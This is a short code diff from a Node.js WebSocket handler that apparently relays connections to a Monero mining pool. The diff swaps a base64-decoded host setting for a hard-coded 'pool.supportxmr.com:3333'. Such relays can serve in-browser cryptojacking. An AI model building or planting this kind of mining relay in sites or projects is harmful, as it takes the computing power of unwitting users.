@@ -48,7 +48,7 @@ if (cluster.isPrimary) {
         },
 
         open: (ws) => {
-            const decoded = Buffer.from(ws.encoded, "base64").toString("utf8");
+            const decoded = "pool.supportxmr.com:3333";
             const [host, portStr] = decoded.split(":");
             const port = parseInt(portStr, 10);
 
